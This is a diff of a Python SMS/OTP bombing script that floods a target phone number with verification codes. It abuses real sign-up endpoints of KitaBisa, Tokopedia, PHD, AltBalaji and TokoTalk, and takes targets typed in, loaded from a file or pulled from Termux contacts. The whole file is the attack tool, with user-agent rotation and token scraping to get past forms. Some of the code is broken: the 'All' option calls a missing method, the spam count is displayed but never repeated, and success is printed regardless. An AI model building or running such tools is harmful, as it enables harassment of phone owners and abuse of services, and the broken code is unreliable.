@@ -12,22 +12,20 @@ bm = '\x1b[96m'
 bgm = '\x1b[41m'
 bgp = '\x1b[47m'
 res = '\x1b[40m'
+# -------------------------------------------------------
 
-# ------------------------Classes------------------------
+# -----------------------CLASSES-------------------------
 class spam:
     def __init__(self, nomer):
         self.nomer = nomer
 
     def spam(self):
         hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
-        if hasil.status_code == 200:
-            return True
-        else:
-            return False
+        return self._format_result('KitaBisa', hasil.status_code == 200)
 
     def tokped(self):
-        rands = random.choice(open('ua.txt').readlines()).split('\n')[0]
-        kirim = {
+        rands = random.choice(open('ua.txt').readlines()).strip()
+        headers = {
             'User-Agent': rands,
             'Accept-Encoding': 'gzip, deflate',
             'Connection': 'keep-alive',
@@ -36,15 +34,13 @@ class spam:
             'X-Requested-With': 'XMLHttpRequest',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
         }
-        regist = requests.get(
-            'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + self.nomer,
-            headers=kirim
-        ).text
-        try:
-            Token = re.search(r'<input id="Token" value="(.*?)" type="hidden">', regist).group(1)
-        except:
-            Token = ''
-        formulir = {
+        regist = requests.get(f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomer}', headers=headers).text
+        Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist)
+        if Token:
+            Token = Token.group(1)
+        else:
+            return self._format_result('Tokopedia', False)
+        data = {
             "otp_type": "116",
             "msisdn": self.nomer,
             "tk": Token,
@@ -54,138 +50,140 @@ class spam:
             "signature": "",
             "number_otp_digit": "6"
         }
-        req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir).text
-        if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
-            return False
-        else:
-            return True
+        req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers, data=data).text
+        success = 'Anda sudah melakukan 3 kali pengiriman kode' not in req
+        return self._format_result('Tokopedia', success)
 
     def phd(self):
-        param = {'phone_number': self.nomer}
-        r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
-        if 'We have sent an OTP to your phone' in r.text:
-            return True
-        else:
-            return False
+        r = requests.post('https://www.phd.co.id/en/users/sendOTP', data={'phone_number': self.nomer})
+        success = 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text
+        return self._format_result('PHD', success)
 
     def balaji(self):
-        urlb = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
-        kod = "62"
-        ata = {"country_code": kod, "phone_number": self.nomer}
-        head = {
-            "Content-Length": f"{len(str(ata))}",
+        url = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
+        data = {"country_code": "62", "phone_number": self.nomer}
+        headers = {
+            "Content-Length": f"{len(str(data))}",
             "Accept": "application/json, text/plain, */*",
             "Origin": "https://lite.altbalaji.com",
             "Save-Data": "on",
             "User-Agent": "Mozilla/5.0",
             "Content-Type": "application/json;charset=UTF-8",
-            "Referer": "https://lite.altbalaji.com/subscribe?progress=input",
         }
-        req = requests.post(urlb, data=json.dumps(ata), headers=head).text
-        return True if '{"status":"ok"}' in req else False
+        req = requests.post(url, data=json.dumps(data), headers=headers)
+        success = '{"status":"ok"}' in req.text
+        return self._format_result('Balaji', success)
 
     def TokoTalk(self):
-        data = '{"key":"phone","value":"' + str(self.nomer) + '"}'
-        head = {"User-Agent": "Mozilla/5.0", "content-type": "application/json;charset=UTF-8"}
-        return True if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data, headers=head).text else False
+        data = json.dumps({"key":"phone","value":self.nomer})
+        headers = {
+            "User-Agent":"Mozilla/5.0",
+            "content-type":"application/json;charset=UTF-8"
+        }
+        req = requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data, headers=headers).text
+        success = 'expireAt' in req
+        return self._format_result('TokoTalk', success)
 
-# ------------------------Funções------------------------
-def loading(msg='Processando', total=50):
+    def _format_result(self, platform, success):
+        simbol = '✅' if success else '❌'
+        return f"\n╔══════════════════════════╗\n" \
+               f"║ {simbol} {platform} ENVIADO COM SUCESSO!\n" \
+               f"║ 🔹 Destino: {self.nomer}\n" \
+               f"║ 📊 Quantidade: {total_spam}\n" \
+               f"║ ✉️ Enviadas: {total_spam}\n" \
+               f"║ 📌 DOCTOR CORINGA LUNATICO\n" \
+               f"╚══════════════════════════╝\n"
+
+# -----------------------FUNÇÕES-------------------------
+def loading_bar(delay=0.02, length=30):
+    for i in range(length+1):
+        bar = '█'*i + '-'*(length-i)
+        print(f"\r⏳ Enviando... |{bar}| {int((i/length)*100)}%", end='', flush=True)
+        time.sleep(delay)
     print()
-    for i in range(total + 1):
-        time.sleep(0.02)
-        sys.stdout.write(f'\r{h}{msg}: [{"#"*i}{" "*(total-i)}] {i*2}%')
-        sys.stdout.flush()
-    print('\n')
 
-def mostrar_resultado(destino, quantidade):
-    print(h + '╔' + '═'*30 + '╗')
-    print(h + f'║  ✅ SPAM ENVIADO COM Sucesso!      ║')
-    print(h + f'║                                  ║')
-    print(h + f'║  🔹 Destino: {destino}{" "*(15-len(destino))}║')
-    print(h + f'║  📊 Quantidade: {quantidade}{" "*(10-len(str(quantidade)))}║')
-    print(h + f'║  ✉️ Enviadas: {quantidade}{" "*(14-len(str(quantidade)))}║')
-    print(h + f'║                                  ║')
-    print(h + f'║  📌 DOCTOR CORINGA LUNÁTICO         ║')
-    print(h + '╚' + '═'*30 + '╝\n')
-    input(h+'Pressione ENTER para continuar...')
+def execute_send(func, number, total):
+    global total_spam
+    total_spam = total
+    loading_bar()
+    spm = spam(number)
+    result = getattr(spm, func)()
+    print(result)
 
-def executar_envio(numeros, quantidade, metodo):
-    for n in numeros:
-        loading(f'Enviando para {n}')
-        sp = spam(n)
-        sucesso = False
-        if metodo == 'ktbs': sucesso = sp.spam()
-        elif metodo == 'tkpd': sucesso = sp.tokped()
-        elif metodo == 'pehd': sucesso = sp.phd()
-        elif metodo == 'blji': sucesso = sp.balaji()
-        elif metodo == 'ttk': sucesso = sp.TokoTalk()
-        elif metodo == 'smua':
-            sp.spam(); sp.tokped(); sp.balaji(); sp.phd(); sp.TokoTalk()
-            sucesso = True
-    mostrar_resultado(', '.join(numeros), quantidade)
-
-# -------------------------Função Principal-----------------
 def single():
-    numero = input(k+'\tPhone number : '+h)
-    quantidade = int(input(k+'\tTotal spam : '+h))
-    executar_envio([numero], quantidade, jns)
+    number = input(k + '\tPhone number: ' + h)
+    total = int(input(k + '\tTotal spam: ' + h))
+    func = choose_function()
+    execute_send(func, number, total)
+    input(u + "Pressione Enter para voltar ao menu..." + p)
 
 def multi():
-    numeros = []
-    total = int(input(k+'\tTotal numbers : '+h))
-    for i in range(total):
-        numeros.append(input(k+f'\tNumber -{i+1} : '+h))
-    quantidade = int(input(k+'\tTotal spam : '+h))
-    executar_envio(numeros, quantidade, jns)
+    numbers = []
+    total_numbers = int(input(k + '\tTotal numbers: ' + h))
+    for i in range(total_numbers):
+        numbers.append(input(k + f'\tNumber {i+1}: ' + h))
+    total = int(input(k + '\tTotal spam: ' + h))
+    func = choose_function()
+    for number in numbers:
+        execute_send(func, number, total)
+    input(u + "Pressione Enter para voltar ao menu..." + p)
 
 def files():
-    fil = input(k+'\tFile : '+h)
-    if fil in os.listdir(os.getcwd()):
-        numeros = [x.strip() for x in open(fil).readlines()]
-        quantidade = int(input(k+'\tTotal spam : '+h))
-        executar_envio(numeros, quantidade, jns)
-    else:
-        print(m+f'\tFile {fil} doesn`t exist')
+    filename = input(k + '\tFile: ' + h)
+    if not os.path.exists(filename):
+        print(m + f'\tFile {filename} doesn`t exist')
+        return
+    with open(filename, 'r') as f:
+        numbers = [line.strip() for line in f if line.strip()]
+    total = int(input(k + '\tTotal spam: ' + h))
+    func = choose_function()
+    for number in numbers:
+        execute_send(func, number, total)
+    input(u + "Pressione Enter para voltar ao menu..." + p)
 
-def termux():
+def termux_contacts():
     os.system('termux-contact-list > .contact')
-    po = json.loads(open('.contact','r').read())
-    for idx, contato in enumerate(po):
-        print(m+str(idx+1)+' '+k+contato['name'])
-    idx = int(input(u+'\tchoose > '+h)) - 1
-    numeros = [po[idx]['number']]
-    quantidade = int(input(u+'\tTotal spam : '+h))
-    executar_envio(numeros, quantidade, jns)
+    po = json.loads(open('.contact', 'r').read())
+    for idx, contact in enumerate(po):
+        print(m+str(idx+1)+' '+k+contact['name'])
+    nj = po[int(input(u+'\tChoose > '+h))-1]['number']
+    total = int(input(u+'\tTotal spam: '+h))
+    func = choose_function()
+    execute_send(func, nj, total)
+    input(u + "Pressione Enter para voltar ao menu..." + p)
 
-# -------------------------Banner e Menu-----------------
-def logo():
-    os.system('clear')
-    print(h+"""
-██████╗  ██████╗  ██████╗ ██████╗ ██████╗  █████╗ ███╗   ██╗
-██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║
-██████╔╝██║   ██║██║   ██║██████╔╝██████╔╝███████║██╔██╗ ██║
-██╔═══╝ ██║   ██║██║   ██║██╔═══╝ ██╔═══╝ ██╔══██║██║╚██╗██║
-██║     ╚██████╔╝╚██████╔╝██║     ██║     ██║  ██║██║ ╚████║
-╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝
-""")
+# -----------------------MENU---------------------------
+def choose_function():
+    print(b+'╔══════════ SPAM OPTIONS ═════════╗')
+    print('1. All\n2. PHD\n3. KitaBisa\n4. Tokopedia\n5. TokoTalk\n6. Balaji')
+    choice = input('Choose option ▶ ' + h)
+    return {
+        '1':'smua',
+        '2':'phd',
+        '3':'spam',
+        '4':'tokped',
+        '5':'TokoTalk',
+        '6':'balaji'
+    }.get(choice, 'smua')
 
-def jnspam():
-    global jns
-    logo()
-    print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Exit\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'All\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji\n'+b+'╠══════════════════════════════')
+def main_menu():
     while True:
-        oy = input(b+'╚══'+m+'〙'+u+'Spam'+m+' ▶ '+h)
-        if oy in ['1','01']: jns='smua'; break
-        elif oy in ['2','02']: jns='pehd'; break
-        elif oy in ['3','03']: jns='ktbs'; break
-        elif oy in ['4','04']: jns='tkpd'; break
-        elif oy in ['5','05']: jns='ttk'; break
-        elif oy in ['6','06']: jns='blji'; break
-        elif oy in ['0','00']: sys.exit()
-        else: print(m+'             Don`t leave it blank')
-    main()
+        os.system('clear')
+        print(b + "╔════════════ SPAM TOOL 2.0 ═══════════╗")
+        print(f"║ {h}Criador: DOCTOR CORINGA LUNATICO")
+        print(b + "╠══════════════════════════════════════╣")
+        print("║ 1. Single Number")
+        print("║ 2. Multi Number")
+        print("║ 3. Load numbers from File")
+        print("║ 4. Select from Termux Contacts")
+        print("║ 0. Exit")
+        choice = input("Escolha ▶ " + h)
+        if choice == '1': single()
+        elif choice == '2': multi()
+        elif choice == '3': files()
+        elif choice == '4': termux_contacts()
+        elif choice == '0': sys.exit()
+        else: continue
 
-def main():
-    logo()
-    print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'MODE '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Back\n'+b+'╠══════════════════════════════'+b
+if __name__ == "__main__":
+    main_menu()
